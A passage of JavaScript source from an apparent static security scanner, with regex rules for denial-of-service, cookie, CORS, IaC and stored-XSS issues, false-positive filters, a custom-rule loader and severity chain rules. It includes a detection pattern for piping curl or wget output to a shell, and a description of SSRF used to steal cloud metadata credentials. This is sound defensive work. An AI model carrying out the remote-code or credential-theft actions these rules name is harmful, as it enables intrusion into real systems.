  {regex:/new\s+Busboy\s*\(\s*(?:\{(?![^}]{0,400}(?:limits|fileSize))[^}]{0,400}\}|\s*\))/g,
   type:"File Upload",vuln:"Busboy Without File Size Limit (DoS)",severity:"high",cwe:"CWE-400",stride:"Denial of Service",
   fix:"Set limits: { fileSize: 10 * 1024 * 1024 } in Busboy constructor options to cap upload size."},
  {regex:/new\s+(?:Formidable|IncomingForm)\s*\(\s*(?:\{(?![^}]{0,400}(?:maxFileSize|maxFields))[^}]{0,400}\}|\s*\))/g,
   type:"File Upload",vuln:"Formidable Without File Size Limit (DoS)",severity:"high",cwe:"CWE-400",stride:"Denial of Service",
   fix:"Set maxFileSize in Formidable options: new Formidable({ maxFileSize: 10 * 1024 * 1024 })"},
  // ── #25: Synchronous blocking I/O in server context (DoS) ───────────────────
  {regex:/\b(?:fs\.readFileSync|fs\.writeFileSync|fs\.appendFileSync|fs\.readdirSync|fs\.statSync|fs\.existsSync|crypto\.pbkdf2Sync)\s*\(/g,
   type:"Blocking I/O",vuln:"Synchronous Blocking I/O (DoS Risk in Server Context)",severity:"medium",cwe:"CWE-400",stride:"Denial of Service",
   fix:"Replace with async equivalents: fs.promises.readFile(), fs.promises.stat(), util.promisify(crypto.pbkdf2)()"},
  // ── #26: Body parser without size limit (DoS — large payload / Billion Laughs) ─
  {regex:/(?:app|router)\s*\.\s*use\s*\(\s*express\s*\.\s*(?:json|urlencoded)\s*\(\s*\)\s*\)/g,
   type:"Body Parser",vuln:"Express Body Parser Without Size Limit (DoS)",severity:"medium",cwe:"CWE-400",stride:"Denial of Service",
   fix:"Set an explicit size limit: app.use(express.json({ limit: '1mb' })); app.use(express.urlencoded({ limit: '1mb', extended: true }))"},
  {regex:/xml2js\s*\.\s*(?:parseString|parseStringPromise)\s*\(\s*(?:req\.|body\.|query\.|params\.|\w+\.body|\w+\.rawBody)/gi,
   type:"XML Parser",vuln:"XML from User Input Without Size Limit (Billion Laughs Risk)",severity:"high",cwe:"CWE-776",stride:"Denial of Service",
   fix:"Check payload size before parsing: if (raw.length > 1e6) return res.status(413).end(); Consider fast-xml-parser which limits entity expansion."},
];

// FP-4: classify a weak-hash use site as 'security' (password/HMAC/token verify),
// 'fingerprint' (cache key / ETag / content fingerprint), or 'unknown'.
const _HASH_SECURITY_RE = /\b(?:password|passwd|pwd|passcode|secret(?!\s*(?:Hint|Description|Label))|token(?!\s*(?:Name|Label))|credential|hmac|signature|verifyToken|verifyPassword|verifyHash|comparePassword|authToken|sessionToken|csrfToken|jwtSign|jwtVerify|timingSafeEqual)\b/i;
const _HASH_FINGERPRINT_RE = /\b(?:etag|e[-_]tag|cache[-_]?key|cacheKey|fingerprint|checksum|content[-_]?hash|contentHash|bundle[-_]?hash|chunk[-_]?hash|asset[-_]?hash|file[-_]?hash|dedup(?:e|ication)?|stable[-_]?id|short[-_]?id|hashForId|hash[-_]?for[-_]?id|integrity[-_]?hash|sri[-_]?hash)\b/i;
function _classifyHashContext(_matchText, ctx){
  const lines = ctx.lines || [];
  const line = ctx.line || 0;
  const surround = lines.slice(Math.max(0, line-5), Math.min(lines.length, line+5)).join('\n');
  if (_HASH_SECURITY_RE.test(surround)) return 'security';
  if (_HASH_FINGERPRINT_RE.test(surround)) return 'fingerprint';
  return 'unknown';
}
// Severity functions for the MD5/SHA1 patterns. Return null to suppress entirely.
function _md5Sha1PasswordHashSeverity(matchText, ctx){
  const cls = _classifyHashContext(matchText, ctx);
  if (cls === 'security')    return 'critical';
  if (cls === 'fingerprint') return null;        // not a security issue here
  return 'medium';                                // unknown context: still flag, just lower
}
function _md5Sha1WeakHashSeverity(matchText, ctx){
  const cls = _classifyHashContext(matchText, ctx);
  if (cls === 'security')    return 'high';
  if (cls === 'fingerprint') return null;        // ETag / cache key / fingerprint — fine
  return 'medium';
}

// FP-8: object-literal options parser. Returns a Map of key→raw-value-text
// for the simple `{a: x, b: y}` shape. Returns null if the literal can't be
// parsed (spread / dynamic / nested) — caller decides what to do with null.
function _parseOptsObject(text) {
  if (typeof text !== 'string') return null;
  const m = text.match(/\{([\s\S]*?)\}/);
  if (!m) return null;
  const body = m[1];
  if (/\.\.\.\w/.test(body)) return null;        // {...spread}
  const out = new Map();
  let depth = 0, key = '', val = '', mode = 'key', quote = null;
  for (let i = 0; i < body.length; i++) {
    const ch = body[i];
    if (quote) { if (ch === quote && body[i-1] !== '\\') quote = null; (mode==='key'?key:val).length<256&&(mode==='key'?(key+=ch):(val+=ch)); continue; }
    if (ch === "'" || ch === '"' || ch === '`') { quote = ch; (mode==='key'?key:val) + ch; if (mode==='key') key+=ch; else val+=ch; continue; }
    if (ch === '{' || ch === '[' || ch === '(') depth++;
    if (ch === '}' || ch === ']' || ch === ')') depth--;
    if (depth < 0) break;
    if (depth === 0 && mode === 'key' && ch === ':') { mode = 'val'; continue; }
    if (depth === 0 && ch === ',') {
      const k = key.trim().replace(/^['"`]|['"`]$/g, '');
      if (k) out.set(k, val.trim());
      key = ''; val = ''; mode = 'key'; continue;
    }
    if (mode === 'key') key += ch; else val += ch;
  }
  const k = key.trim().replace(/^['"`]|['"`]$/g, '');
  if (k) out.set(k, val.trim());
  return out;
}
// Predicate: examine cookie call args. Returns {fire,reason,missing}.
function _cookiePredicate(matchText){
  const opts = _parseOptsObject(matchText);
  if (!opts) return {fire:true, reason:'no-options-object'};
  const httpOnly = /^true$/i.test(opts.get('httpOnly')||'');
  const secure   = /^true$/i.test(opts.get('secure')||'');
  const sameSite = /['"`](?:strict|lax|none)['"`]/i.test(opts.get('sameSite')||'');
  const missing  = [!httpOnly&&'httpOnly', !secure&&'secure', !sameSite&&'sameSite'].filter(Boolean);
  return {fire: missing.length>0, reason:'flags-missing', missing};
}
// Predicate: examine cors() args. Returns {fire,reason}.
function _corsPredicate(matchText){
  // Match: cors(<args>)
  const am = matchText.match(/cors\s*\(([\s\S]*)\)$/);
  const inside = am ? am[1].trim() : '';
  if (!inside) return {fire:true, reason:'cors-no-options'};       // cors() defaults allow *
  if (/^['"`]\*['"`]$/.test(inside)) return {fire:true, reason:'cors-star-string'};
  const opts = _parseOptsObject(inside);
  if (!opts) {
    // Couldn't parse — fall back to substring inspection for the obvious bad cases
    if (/origin\s*:\s*['"`]\*['"`]/.test(inside)) return {fire:true, reason:'cors-star-origin'};
    if (/origin\s*:\s*true\b/.test(inside)) return {fire:true, reason:'cors-origin-true'};
    return {fire:false};
  }
  const origin = opts.get('origin') || '';
  if (!origin) return {fire:true, reason:'cors-no-origin'};
  if (/^['"`]\*['"`]$/.test(origin) || /\bcb\s*\(\s*null\s*,\s*true\s*\)/.test(origin) || /^true$/.test(origin)) {
    return {fire:true, reason:'cors-permissive-origin'};
  }
  return {fire:false};
}

// #21: Predicate — suppress auth-endpoint warning when rate-limit middleware is visible on the same line
function _authRateLimitPredicate(matchText, ctx) {
  const snippet = ctx?.snippet || matchText;
  if (/\b(?:rateLimit|throttle|slowDown|limiter|rateLimiter|apiLimiter|loginLimiter|authLimiter)\s*[,)]/i.test(snippet))
    return { fire: false, reason: 'rate-limit-arg-present' };
  return { fire: true };
}

// Structural vulnerability scanner, no source-sink taint chain required
function scanStructuralVulns(fp, raw) {
  const cleaned = stripNoise(raw);
  const lines = raw.split('\n');
  const findings = [];
  for (const pat of STRUCTURAL_VULN_PATTERNS) {
    const re = new RegExp(pat.regex.source, pat.regex.flags);
    let m;
    while ((m = re.exec(cleaned))) {
      const line = lineAt(cleaned, m.index);
      const snippet = lines[line - 1]?.trim() || '';
      // FP-8: per-pattern predicate gate. If `predicate` returns {fire:false},
      // the finding is suppressed (and logged for --include-suppressed).
      if (typeof pat.predicate === 'function') {
        const verdict = pat.predicate(m[0], { file: fp, line, snippet });
        if (verdict && !verdict.fire) {
          _suppressionLog.push({vuln:pat.vuln, file:fp, line, snippet, reason:'predicate-pass:'+(verdict.reason||'ok')});
          continue;
        }
      }
      // FP-4: severity classifier — return null to suppress, otherwise overrides pat.severity.
      let effectiveSeverity = pat.severity;
      if (typeof pat.severityFn === 'function') {
        const s = pat.severityFn(m[0], { file: fp, line, snippet, lines });
        if (s === null) {
          _suppressionLog.push({vuln:pat.vuln, file:fp, line, snippet, reason:'severity-fn:non-security-context'});
          continue;
        }
        effectiveSeverity = s;
      }
      const id = `struct:${fp}:${line}:${pat.vuln.replace(/\s/g, '_')}`;
      if (!findings.find(f => f.id === id)) {
        findings.push({
          id,
          source: { label: 'Structural Pattern', category: 'Static Analysis', inputType: 'structural', variable: '(pattern)', line, file: fp, snippet },
          sink: { type: pat.type, severity: effectiveSeverity, vuln: pat.vuln, cwe: pat.cwe, stride: pat.stride, line, snippet, args: snippet },
          path: [
            { type: 'source', label: 'Structural Analysis: ' + pat.vuln, line, snippet },
            { type: 'sink', label: pat.type + ' at line ' + line, line, snippet }
          ],
          isSanitized: false, sanitizerType: null,
          severity: effectiveSeverity,
          vuln: pat.vuln, cwe: pat.cwe, stride: pat.stride, kind: pat.kind,
          file: fp, parser: 'STRUCTURAL'
        });
      }
    }
  }
  return findings;
}


// Feat-2: IaC / container security patterns. Each entry has a `match`
// (regex or fileTypes filter) and produces a finding with kind:'iac'.
const IAC_PATTERNS = [
  // Dockerfile / Containerfile
  { match: /^\s*RUN\s.*?(?:curl|wget)\b[^|\n]*\|\s*(?:sh|bash)/im,
    fileTypes: /Dockerfile|Containerfile|\.dockerfile$/i,
    severity: 'high', cwe: 'CWE-829', vuln: 'Dockerfile: RUN curl|sh — remote-code execution at build time',
    fix: 'Download to a file, verify checksum, then execute. Never pipe network output to a shell.' },
  { match: /^\s*USER\s+root\s*$/im,
    fileTypes: /Dockerfile|Containerfile|\.dockerfile$/i,
    severity: 'medium', cwe: 'CWE-250', vuln: 'Dockerfile: USER root — container runs as root',
    fix: 'Add a non-root USER directive after package installation: USER nonroot' },
  { match: /:\s*latest\s*$/im,
    fileTypes: /Dockerfile|Containerfile|\.dockerfile$/i,
    severity: 'low', cwe: 'CWE-829', vuln: 'Dockerfile: image uses :latest tag',
    fix: 'Pin to a specific version or digest (image@sha256:...) for reproducible builds.' },
  // docker-compose
  { match: /privileged:\s*true/i,
    fileTypes: /docker-compose\.ya?ml$/i,
    severity: 'critical', cwe: 'CWE-250', vuln: 'docker-compose: privileged container',
    fix: 'Remove privileged:true. Use specific capabilities (cap_add) only as needed.' },
  // Kubernetes
  { match: /privileged:\s*true/i,
    fileTypes: /(?:^|\/)k8s\/.*\.ya?ml$/i,
    severity: 'critical', cwe: 'CWE-250', vuln: 'K8s: securityContext.privileged: true',
    fix: 'Remove privileged:true. Set runAsNonRoot:true and drop ALL capabilities.' },
  { match: /hostNetwork:\s*true/i,
    fileTypes: /(?:^|\/)k8s\/.*\.ya?ml$/i,
    severity: 'high', cwe: 'CWE-250', vuln: 'K8s: hostNetwork mounted',
    fix: 'Remove hostNetwork:true. Use a Service/Ingress for external traffic.' },
  { match: /runAsNonRoot:\s*false/i,
    fileTypes: /(?:^|\/)k8s\/.*\.ya?ml$/i,
    severity: 'medium', cwe: 'CWE-250', vuln: 'K8s: runAsNonRoot:false',
    fix: 'Set runAsNonRoot:true and a non-zero runAsUser.' },
  // Terraform
  { match: /acl\s*=\s*"public-read"/i,
    fileTypes: /\.tf$/i,
    severity: 'high', cwe: 'CWE-200', vuln: 'Terraform: S3 bucket ACL = public-read',
    fix: 'Use private ACL + explicit IAM policies for any sharing. Never publish data unintentionally.' },
  { match: /Action\s*=\s*"\*"|Action\s*=\s*\[\s*"\*"\s*\]/i,
    fileTypes: /\.tf$/i,
    severity: 'high', cwe: 'CWE-732', vuln: 'Terraform: IAM Action = "*" (wildcard)',
    fix: 'Specify the exact IAM actions required. Wildcards grant excessive privilege.' },
  { match: /encrypted\s*=\s*false|encryption\s*=\s*"none"/i,
    fileTypes: /\.tf$/i,
    severity: 'medium', cwe: 'CWE-311', vuln: 'Terraform: encryption disabled at rest',
    fix: 'Enable encryption at rest (encrypted = true; or kms_key_id = ...).' },
  // GitHub Actions
  { match: /\$\{\{\s*github\.event\.(?:issue|pull_request)\.title|\$\{\{\s*github\.event\.comment\.body/i,
    fileTypes: /\.github\/workflows\/.*\.ya?ml$/i,
    severity: 'high', cwe: 'CWE-78', vuln: 'GitHub Actions: untrusted github.event input interpolated into shell',
    fix: 'Pass user-controlled fields via env vars and reference them as $VARNAME in the script body, not via ${{ }} interpolation.' },
];

function scanIaC(fp, raw){
  if (!_isIaCFile(fp)) return [];
  const findings = [];
  const lines = raw.split('\n');
  for (const p of IAC_PATTERNS) {
    if (!p.fileTypes.test(fp)) continue;
    const re = new RegExp(p.match.source, p.match.flags.replace(/g/g, '') + 'g');
    let m;
    while ((m = re.exec(raw))) {
      const line = raw.substring(0, m.index).split('\n').length;
      findings.push({
        id: `iac:${fp}:${line}:${p.vuln.replace(/\s/g, '_').slice(0, 60)}`,
        kind: 'iac', severity: p.severity, vuln: p.vuln,
        cwe: p.cwe, stride: 'Elevation of Privilege',
        file: fp, line, snippet: lines[line - 1]?.trim() || '',
        fix: p.fix,
      });
    }
  }
  return findings;
}

// FP-2: layered filter pipeline for credential-shaped findings.
// Returns { skip: bool, reason?: string } — when `skip` is true, the caller
// records the suppression and does not emit a finding.
const _CRED_PATH_RE = /(?:^|\/)(?:locales|i18n|translations|storybook|stories|docs|examples|templates|fixtures|mocks|stubs)(?:\/|$)/i;
const _CRED_FILE_RE = /\.(?:test|spec|fixture|mock|stories)\.[^./]+$/i;
const _CRED_VARNAME_RE = /(?:placeholder|label|hint|description|example|default|mock|sample|demo|fake|dummy|prompt|tooltip|message|aria|title|column|column_name|field|key_name)/i;
const _CRED_PLACEHOLDER_VAL_RE = /^(?:your[-_]|change[-_]?me|replace[-_]?me|placeholder|example|<[^>]+>|TODO|FIXME|xxx+|test[-_]?key|default[-_]?key|null|undefined|empty|n\/a|none)/i;
const _CRED_I18N_VAL_RE = /^[^\x00-\x7F]/;
const _CRED_JSX_ATTR_RE = /<\s*(?:input|TextField|TextInput|FormControl|Field|Form\.Control|TextArea|select|option|label|button)\b[^>]*$/i;
function _isFalsePositiveCredential(fp, snippet, fullMatch){
  const pathLC = fp.replace(/\\\\/g,'/').toLowerCase();
  if (_CRED_PATH_RE.test(pathLC) || _CRED_FILE_RE.test(pathLC)) return {skip:true, reason:'path-filter'};
  // Extract LHS identifier from the snippet (handles `const x =`, `x =`, `{ x:`, etc.)
  const am = snippet.match(/(?:^|\W)(\w{2,})\s*[:=]\s*['"]/);
  const varName = am ? am[1] : '';
  if (varName && _CRED_VARNAME_RE.test(varName)) return {skip:true, reason:'var-name-placeholder'};
  // Extract the literal value
  const valM = fullMatch.match(/['"]([^'"]{3,})['"]/);
  const val = valM ? valM[1] : '';
  if (val.length < 8) return {skip:true, reason:'value-too-short'};
  if (_CRED_PLACEHOLDER_VAL_RE.test(val)) return {skip:true, reason:'placeholder-value'};
  // Non-ASCII content with i18n-shaped variable name → translation string
  if (_CRED_I18N_VAL_RE.test(val) && /(?:label|message|text|title|description|placeholder)/i.test(varName)) {
    return {skip:true, reason:'i18n-text'};
  }
  // JSX/HTML attribute context: snippet ends in `<input ... ` before the matched key=val
  if (_CRED_JSX_ATTR_RE.test(snippet.substring(0, snippet.indexOf(fullMatch)))) {
    return {skip:true, reason:'jsx-attr'};
  }
  return {skip:false};
}
// Module-level suppression log; cleared at the start of each runFullScan invocation.
const _suppressionLog = [];
function _resetSuppressions(){ _suppressionLog.length = 0; }
function _getSuppressions(){ return [..._suppressionLog]; }

// FP-9 / Feat-4: custom rules loaded from .agentic-security/rules.{yml,yaml,json}
// at scan root. Mutates SOURCE/SINK/SANITIZER pattern arrays in place when active;
// snapshot lengths from the first call so subsequent scans can restore baseline.
let _customSuppressions = [];
let _baselineLengths = null;   // {sources, sinks, sanitizers}
let _customAdded = { sources: 0, sinks: 0, sanitizers: 0, suppressions: 0 };

function _resetCustomRules(){
  if (_baselineLengths) {
    SOURCE_PATTERNS.length = _baselineLengths.sources;
    SINK_PATTERNS.length = _baselineLengths.sinks;
    SANITIZER_PATTERNS.length = _baselineLengths.sanitizers;
  } else {
    _baselineLengths = {
      sources: SOURCE_PATTERNS.length,
      sinks: SINK_PATTERNS.length,
      sanitizers: SANITIZER_PATTERNS.length,
    };
  }
  _customSuppressions = [];
  _customAdded = { sources: 0, sinks: 0, sanitizers: 0, suppressions: 0 };
}

async function _loadCustomRules(scanRoot){
  _resetCustomRules();
  if (!scanRoot) return null;
  _customAdded = { sources: 0, sinks: 0, sanitizers: 0, suppressions: 0 };
  _customSuppressions = [];
  let raw = null, parsedObj = null;
  for (const ext of ['rules.yml', 'rules.yaml', 'rules.json']) {
    const p = path.join(scanRoot, '.agentic-security', ext);
    try { raw = fs.readFileSync(p, 'utf8'); } catch { continue; }
    try {
      if (ext.endsWith('.json')) parsedObj = JSON.parse(raw);
      else parsedObj = yaml.load(raw);
      break;
    } catch (e) {
      console.error(`agentic-security: failed to parse ${ext}: ${e.message}`);
      return null;
    }
  }
  if (!parsedObj || typeof parsedObj !== 'object') return null;

  // Sources
  for (const s of (parsedObj.sources || [])) {
    if (!s.pattern) continue;
    try {
      SOURCE_PATTERNS.push({
        regex: new RegExp(s.pattern, 'g'),
        category: s.category || 'Custom Source',
        getLabel: () => s.label || 'custom-source',
        inputType: () => s.inputType || 'http',
      });
      _customAdded.sources++;
    } catch {}
  }
  // Sinks
  for (const s of (parsedObj.sinks || [])) {
    if (!s.pattern) continue;
    try {
      SINK_PATTERNS.push({
        regex: new RegExp(s.pattern, 'g'),
        type: s.type || 'Custom Sink',
        severity: s.severity || 'high',
        vuln: s.vuln || 'Custom Vulnerability',
        cwe: s.cwe || '',
        stride: s.stride || '',
      });
      _customAdded.sinks++;
    } catch {}
  }
  // Sanitizers
  for (const s of (parsedObj.sanitizers || [])) {
    if (!s.pattern) continue;
    try {
      SANITIZER_PATTERNS.push({
        regex: new RegExp(s.pattern, 'gi'),
        type: s.type || 'Custom Sanitizer',
      });
      _customAdded.sanitizers++;
    } catch {}
  }
  // Suppressions
  for (const sup of (parsedObj.suppressions || [])) {
    if (!sup.rule) continue;
    _customSuppressions.push({
      rule: sup.rule,
      files: Array.isArray(sup.files) ? sup.files : (sup.files ? [sup.files] : ['**']),
      reason: sup.reason || 'custom-suppression',
    });
    _customAdded.suppressions++;
  }
  return _customAdded;
}

// Apply custom suppressions to a finding's vuln+file. Returns true if suppressed.
function _isCustomSuppressed(vuln, file){
  for (const sup of _customSuppressions) {
    if (sup.rule !== vuln) continue;
    for (const fp of sup.files) {
      // Simple glob support: ** matches anything; file ends with the literal path
      if (fp === '**') return sup;
      if (file === fp || file.endsWith('/' + fp) || file === fp.replace(/^\.\//, '')) return sup;
    }
  }
  return null;
}

// FP-6: project-level index built once per scan, used by logic-pattern gates
// to confirm operational context before emitting findings.
const _ECOMMERCE_MODEL_RE = /\b(?:Order|Purchase|Cart|Checkout|Transaction|OrderItem|BasketItem|Subscription|Invoice|Payment)\b/;
let _projectIndex = { hasEcommerceModel: false };
function _buildProjectIndex(fileContents){
  let hasEcommerce = false;
  for (const fp of Object.keys(fileContents)) {
    const c = fileContents[fp];
    if (typeof c !== 'string') continue;
    // Strip comments before checking — keywords in JSDoc / TODO / docstrings shouldn't
    // count as evidence of an e-commerce model. Only real code does.
    if (_ECOMMERCE_MODEL_RE.test(stripNoise(c))) { hasEcommerce = true; break; }
  }
  _projectIndex = { hasEcommerceModel: hasEcommerce };
}

const _COUPON_MUTATION_RE = /\b(?:apply|redeem|validate|use|deduct|decrement|increment|update|save|consume|create|destroy|remove|insert)\b/i;
const _REAUTH_PRESENT_RE  = /\b(?:bcrypt\.compare|crypto\.timingSafeEqual|currentPassword|recentLogin|verifyTotp|verifyMfa|mfaToken|requireRecentLogin|requireFreshSession|step[-_]?up|requireFreshAuth|verifyPassword)\b/;

function _logicPredicateFor(vuln){
  if (vuln === 'Feedback Without Purchase Verification') {
    return (matchText, ctx) =>
      _projectIndex.hasEcommerceModel
        ? { fire: true }
        : { fire: false, reason: 'no-ecommerce-context' };
  }
  if (vuln === 'Coupon/Discount Reuse Risk') {
    return (matchText, ctx) => {
      const lines = ctx.lines || [];
      const surround = lines.slice(Math.max(0, ctx.line-5), Math.min(lines.length, ctx.line+5)).join('\n');
      return _COUPON_MUTATION_RE.test(surround)
        ? { fire: true }
        : { fire: false, reason: 'coupon-display-only' };
    };
  }
  if (vuln === 'Sensitive Account Mutation Without Re-Authentication') {
    return (matchText, ctx) =>
      _REAUTH_PRESENT_RE.test(matchText)
        ? { fire: false, reason: 'reauth-present' }
        : { fire: true };
  }
  // #22: suppress if a timeout or abort signal is visible in the surrounding lines
  if (vuln === 'Missing Timeout on Outbound HTTP Request (DoS)') {
    return (matchText, ctx) => {
      const lines = ctx.lines || [];
      const surround = lines.slice(Math.max(0, ctx.line - 3), Math.min(lines.length, ctx.line + 6)).join('\n');
      if (/\b(?:timeout|AbortSignal|AbortController|signal)\b/.test(surround)) return { fire: false, reason: 'timeout-present' };
      return { fire: true };
    };
  }
  // #24: suppress if a limit/take/pageSize is inside the matched call expression
  if (vuln === 'ORM Collection Query Without Pagination Limit (DoS)') {
    return (matchText, ctx) => {
      if (/\b(?:limit|take|first|pageSize|LIMIT)\b/.test(matchText)) return { fire: false, reason: 'limit-present' };
      const lines = ctx.lines || [];
      const surround = lines.slice(Math.max(0, ctx.line - 1), Math.min(lines.length, ctx.line + 4)).join('\n');
      if (/\b(?:limit|take|first|pageSize)\b/.test(surround)) return { fire: false, reason: 'limit-nearby' };
      return { fire: true };
    };
  }
  // #27: suppress if an audit/log call is visible in the surrounding handler lines
  if (vuln === 'Sensitive Mutation Without Audit Log (Repudiation Risk)') {
    return (matchText, ctx) => {
      const lines = ctx.lines || [];
      const surround = lines.slice(Math.max(0, ctx.line - 5), Math.min(lines.length, ctx.line + 30)).join('\n');
      if (/\b(?:audit|AuditLog|auditLog|EventLog|activityLog|accessLog)\b/i.test(surround)) return { fire: false, reason: 'audit-present' };
      return { fire: true };
    };
  }
  // #29: suppress if req.ip or user-agent header is logged in the surrounding handler lines
  if (vuln === 'Auth Event Without Source IP Logging (Repudiation Risk)') {
    return (matchText, ctx) => {
      const lines = ctx.lines || [];
      const surround = lines.slice(Math.max(0, ctx.line - 2), Math.min(lines.length, ctx.line + 20)).join('\n');
      if (/req\.ip\b|req\.socket\.remoteAddress|['"]x-forwarded-for['"]|['"]user-agent['"]/i.test(surround)) return { fire: false, reason: 'ip-logged' };
      return { fire: true };
    };
  }
  return null;
}

function scanLogicVulns(fp,raw){
  const cleaned=stripNoise(raw);const lines=raw.split("\n");const results=[];
  for(const pat of LOGIC_PATTERNS){
    const re=new RegExp(pat.regex.source,pat.regex.flags);
    const predicate = _logicPredicateFor(pat.vuln);
    let m;
    while((m=re.exec(cleaned))){
      const line=lineAt(cleaned,m.index);
      const snippet=lines[line-1]?.trim()||"";
      // FP-2: credential FP filter
      if(pat.vuln==='Hardcoded Secret'||pat.vuln==='Hardcoded Credential Check'){
        const fpCheck=_isFalsePositiveCredential(fp,snippet,m[0]);
        if(fpCheck.skip){_suppressionLog.push({vuln:pat.vuln,file:fp,line,snippet,reason:fpCheck.reason});continue;}
      }
      // FP-6: operational-context gate for selected logic patterns
      if (predicate) {
        const verdict = predicate(m[0], {file:fp, line, snippet, lines});
        if (verdict && !verdict.fire) {
          _suppressionLog.push({vuln:pat.vuln, file:fp, line, snippet, reason:'logic-gate:'+verdict.reason});
          continue;
        }
      }
      results.push({vuln:pat.vuln,severity:pat.severity,cwe:pat.cwe,stride:pat.stride,kind:pat.kind,fix:pat.fix,code:pat.code,file:fp,line,snippet});
    }
  }
  const routeRe=/(?:app|router)\s*\.\s*(?:get|post|all)\s*\(\s*['"`](\/(?:debug|admin|test|internal|__)[^'"`]*)/gi;let rm;
  while((rm=routeRe.exec(cleaned))){const line=lineAt(cleaned,rm.index);const nearby=lines.slice(Math.max(0,line-3),line+3).join(" ");const hasAuth=/(?:auth|jwt|protect|middleware)/i.test(nearby);if(!hasAuth)results.push({vuln:"Debug/Admin Route Exposed",severity:"high",cwe:"CWE-489",stride:"Information Disclosure",fix:"Remove debug routes in production or protect with authentication.",code:`// Remove or protect:\n// router.get('${rm[1]}', authMiddleware, handler);`,file:fp,line,snippet:lines[line-1]?.trim()||""});}
  return results;
}

// ─── Stored Taint: ORM field write registry ──────────────────────────────────
// Tracks which model fields are written with unsanitized user input,
// so we can correlate them when the same field is rendered in a response sink.
const STORED_TAINT_FIELD_PATTERNS=[
  // ORM create/update with string fields
  {regex:/(?:create|update|save|findOrCreate|upsert)\s*\(\s*\{([^}]{0,600})\}/g,type:"orm_write"},
  // Django/Python model.save / model.field = value
  {regex:/(?:\w+)\s*\.\s*(?:bio|description|name|title|content|body|message|comment|note|username|about)\s*=\s*(?:request\.|req\.body|ctx\.body|\$_(?:POST|GET|REQUEST))/g,type:"field_assign"},
];
const STORED_TAINT_SINK_PATTERNS=[
  /`[^`]*\$\{[^}]*(?:bio|description|content|body|message|comment|note|about|title)[^}]*\}`/g,
  /(?:innerHTML|outerHTML)\s*=\s*[^;]*(?:bio|description|content|body|message|comment|note|about|title)/g,
  /res\s*\.\s*(?:send|write|json)\s*\([^;]*(?:\.bio\b|\.description\b|\.content\b|\.comment\b|\.note\b|\.about\b)/g,
];

function buildStoredTaintRegistry(fc){
  const registry={};
  const STRING_FIELDS=/(?:bio|description|about|message|content|body|note|comment|title|summary|text|review|feedback|username|displayName)/i;
  for(const[fp,code] of Object.entries(fc)){
    const lines=code.split('\n');
    // Find ORM writes that include string-type fields likely to hold user input
    const ormWrite=/(?:create|update|save|upsert|findOrCreate)\s*\(\s*\{([^}]{0,800})\}/g;
    let m;
    while((m=ormWrite.exec(code))!==null){
      const inner=m[1];
      const fieldMatches=inner.match(/(\w+)\s*:/g)||[];
      for(const f of fieldMatches){
        const fn=f.replace(/\s*:/,'');
        if(STRING_FIELDS.test(fn)){
          // Only register if the value side references a request input
          const fieldRe=new RegExp(fn+'\\s*:\\s*(?:req\\.|request\\.|ctx\\.|\\$_(?:POST|GET)|body\\[|params\\[|query\\[)','i');
          if(fieldRe.test(inner)||/req\.|request\.|ctx\./i.test(inner)){
            const line=code.substring(0,m.index).split('\n').length;
            if(!registry[fn])registry[fn]=[];
            registry[fn].push({file:fp,line,snippet:lines[line-1]?.trim()||''});
          }
        }
      }
    }
  }
  return registry;
}

function crossStoredTaint(fc, storedRegistry){
  const findings=[];
  const RENDER_RE=/(?:`[^`]*\$\{[^}]*\b(FIELD)\b[^}]*\}`|(?:innerHTML|outerHTML)\s*=(?:[^;]{0,200})\b(FIELD)\b|res\s*\.\s*(?:send|write)\s*\([^;]{0,200}\b(FIELD)\b)/;
  const TEMPLATE_LITERAL_SINK=/res\s*\.\s*(?:send|write)\s*\(\s*`[^`]*\$\{[^}]*\b(\w+)\b/g;

  for(const[field,writes] of Object.entries(storedRegistry)){
    for(const[fp,code] of Object.entries(fc)){
      // Skip the write file itself — we want cross-file stored taint
      if(writes.some(w=>w.file===fp))continue;
      const lines=code.split('\n');
      // Check if this file renders the stored field in a dangerous context
      const sinkRe=new RegExp(
        `(?:\`[^\`]*\\$\\{[^}]*\\b${field}\\b[^}]*\\}\`|(?:innerHTML|outerHTML)\\s*=[^;]{0,200}\\b${field}\\b|res\\s*\\.\\s*(?:send|write|json)\\s*\\([^;]{0,200}\\b${field}\\b)`,
        'g'
      );
      let m2;
      while((m2=sinkRe.exec(code))!==null){
        const sinkLine=code.substring(0,m2.index).split('\n').length;
        const snippet=lines[sinkLine-1]?.trim()||'';
        // Check for sanitizer in the vicinity
        const nearby=lines.slice(Math.max(0,sinkLine-5),sinkLine+2).join(' ');
        const isSanitized=/(?:escape|DOMPurify|sanitize|encodeURIComponent|escapeHtml|textContent)\s*\(/.test(nearby);
        if(!isSanitized){
          for(const write of writes){
            const id=`stored:${write.file}:${write.line}:${fp}:${sinkLine}:${field}`;
            findings.push({
              id,
              source:{label:`Stored field: ${field} (written at ${write.file.split('/').pop()}:${write.line})`,category:'Stored Taint',inputType:'stored',variable:field,line:write.line,file:write.file,snippet:write.snippet},
              sink:{type:'Stored Sink',severity:'high',vuln:'Stored XSS / Second-Order Injection',cwe:'CWE-79',stride:'Tampering',line:sinkLine,file:fp,snippet,args:snippet},
              path:[
                {type:'source',label:`ORM write: ${field} = user_input`,line:write.line,snippet:write.snippet},
                {type:'propagation',label:`Stored in database (${field})`,line:write.line,snippet:''},
                {type:'sink',label:`Rendered unsanitized in ${fp.split('/').pop()}:${sinkLine}`,line:sinkLine,snippet}
              ],
              isSanitized:false,sanitizerType:null,
              severity:'high',vuln:'Stored XSS / Second-Order Injection',cwe:'CWE-79',stride:'Tampering',
              file:`${write.file} -> ${fp}`,isCrossFile:true,parser:'STORED_TAINT'
            });
            break; // one finding per (field,sinkFile,sinkLine) is enough
          }
        }
      }
    }
  }
  return findings;
}

// ─── Chain Rules: escalate severity when two finding types co-occur ───────────
const CHAIN_RULES=[
  {a:'SSRF',b:'Hardcoded Secret',combined:'SSRF → Cloud Credential Exfiltration',severity:'critical',cwe:'CWE-918',description:'An SSRF vulnerability combined with hardcoded cloud credentials means an attacker can reach the cloud metadata endpoint (169.254.169.254) to steal IAM tokens, or pivot to internal services using the leaked credentials.'},
  {a:'SSRF',b:'AWS Access Key ID',combined:'SSRF → AWS Credential Exfiltration',severity:'critical',cwe:'CWE-918',description:'SSRF + AWS keys in the same codebase: attacker reaches http://169.254.169.254/latest/meta-data/iam/ to steal instance role tokens, then uses hardcoded keys as fallback. Full cloud account takeover.'},
